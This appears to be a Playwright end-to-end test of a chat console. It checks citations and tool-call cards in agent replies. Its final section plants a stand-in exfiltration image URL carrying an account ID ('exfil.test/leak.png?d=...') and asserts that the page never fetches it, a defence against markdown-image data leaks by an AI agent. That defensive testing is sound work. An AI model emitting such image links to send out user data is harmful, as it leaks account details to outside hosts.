// uc-074 the chat thread on AI Elements, ui layer: docs/usecases/console/chat-thread-blocks.md. Headless Chromium against
// a console whose chat calls the agents service on the scripted model: a cited answer and a tool call, drawn by the
// AI Elements blocks the thread view is built from.
import { AGENTS_PORT, check, chromium, finish, withUiStack } from '@ops-ai/usecase-runner/harness';

const agents = `http://127.0.0.1:${AGENTS_PORT}`;
const TEAM = { 'X-Team-Id': 'team_all', 'Content-Type': 'application/json' };
// A wait armed before a click must not reject unhandled if the script fails first; that crash skips harness cleanup.
const armed = (p) => (p.catch(() => undefined), p);

async function send(page, text) {
  await page.getByRole('textbox', { name: 'Message' }).fill(text);
  const sent = armed(page.waitForResponse((r) => r.request().method() === 'POST' && /\/chat\/threads\/[^/]+\/messages$/.test(r.url()), { timeout: 120_000 }));
  await page.getByRole('button', { name: 'Send', exact: true }).click();
  const res = await sent;
  // The reply streams; wait for its end, but never past 60 s, so a stream that stays open cannot hang the run.
  await Promise.race([res?.finished().catch(() => undefined), new Promise((r) => setTimeout(r, 60_000))]);
}

await withUiStack(async (consoleUrl) => {
  const thread = (await (await fetch(`${agents}/chat/threads`, { method: 'POST', headers: TEAM, body: JSON.stringify({ agentId: 'ag_fraud', kbIds: ['kb_people'] }) })).json()).data;
  const browser = await chromium.launch();
  try {
    const page = await browser.newPage({ viewport: { width: 1440, height: 900 } });
    const errors = [];
    page.on('pageerror', (e) => errors.push(e.message));
    await page.goto(`${consoleUrl}/chat/${thread.id}`, { waitUntil: 'domcontentloaded', timeout: 120_000 });
    await page.getByRole('textbox', { name: 'Message' }).waitFor({ timeout: 120_000 });

    await send(page, 'What is the daily wire limit for a personal account?');
    const answer = page.getByText(/The daily wire limit for a personal account is \$25,000 online/).last();
    const answered = await answer.waitFor({ timeout: 60_000 }).then(() => true, () => false);
    const marker = page.getByRole('button', { name: /^Citation 1: / });
    await marker.waitFor({ timeout: 15_000 }).catch(() => undefined);
    const log = page.getByRole('log');
    const raw = (await log.innerText().catch(() => '')).match(/\[\^?1\]|#cite-/g);
    check('the cited answer streams into the conversation with its [1] drawn as a citation, not as text', answered && (await marker.count()) === 1 && !raw, { answered, markers: await marker.count(), raw });
    await marker.click();
    const opened = await page.getByRole('dialog').getByText(/limit/i).first().waitFor({ timeout: 10_000 }).then(() => true, () => false);
    const location = opened ? await page.getByRole('dialog').getByTestId('citation-location').innerText().catch(() => '') : '';
    // The location line names the section, then the page when the source has pages (PDFs, M2's uc-075), then the version.
    check('the citation opens on its source passage at its section', opened && location.startsWith('Wire Transfer Policy > 4.2 Daily limits'), { opened, location });
    await page.keyboard.press('Escape');

    await send(page, 'Look up CHQ-2219');
    const card = page.getByTestId('chat-tool-call').filter({ hasText: 'lookup_account' }).last();
    const shown = await card.waitFor({ timeout: 60_000 }).then(() => true, () => false);
    await page.getByText('Here is what I found.').last().waitFor({ timeout: 60_000 }).catch(() => undefined);
    const state = await card.getAttribute('data-state').catch(() => null);
    await card.getByText('lookup_account').click();
    const params = await card.getByText('Parameters').waitFor({ timeout: 10_000 }).then(() => true, () => false);
    // The input is highlighted asynchronously (Shiki), so wait for it rather than read it at once.
    const input = await card.getByText(/CHQ-2219/).first().waitFor({ timeout: 10_000 }).then(() => true, () => false);
    check('the tool call shows as a card that opens on its input', shown && state === 'success' && params && input, { shown, state, params, input });

    // A reply that carries a remote image must not fetch it: that request would be the exfiltration path once
    // documents are in context. Every request is recorded, so a fetch shows even when the host does not resolve.
    const leaked = [];
    page.on('request', (r) => r.url().includes('exfil.test') && leaked.push(r.url()));
    // An agent with no knowledge at all, so the reply takes the markdown path rather than the "nothing found" note.
    const bare = (await (await fetch(`${agents}/v1/agents`, { method: 'POST', headers: TEAM, body: JSON.stringify({ name: 'Plain helper', role: 'Answers without documents' }) })).json()).data;
    await fetch(`${agents}/v1/agents/${bare.id}/publish-requests`, { method: 'POST', headers: TEAM, body: JSON.stringify({ version: bare.version, note: 'uc-074' }) });
    const plain = (await (await fetch(`${agents}/chat/threads`, { method: 'POST', headers: TEAM, body: JSON.stringify({ agentId: bare.id, kbIds: [] }) })).json()).data;
    await page.goto(`${consoleUrl}/chat/${plain.id}`, { waitUntil: 'domcontentloaded', timeout: 120_000 });
    await page.getByRole('textbox', { name: 'Message' }).waitFor({ timeout: 120_000 });
    await send(page, 'show image https://exfil.test/leak.png?d=account-CHQ-2219');
    await page.getByText('Here is the chart.').last().waitFor({ timeout: 60_000 }).catch(() => undefined);
    await page.waitForTimeout(1_500);
    const placeholder = await page.getByText('Image blocked: balance chart').count();
    const imgs = await page.locator('img[src*="exfil.test"]').count();
    check('a reply with a remote image fetches nothing from its host and shows the image as not shown', leaked.length === 0 && imgs === 0 && placeholder >= 1, { leaked, imgs, placeholder });

    check('no page errors', errors.length === 0, errors);
  } finally {
    await browser.close();
  }
});

finish();
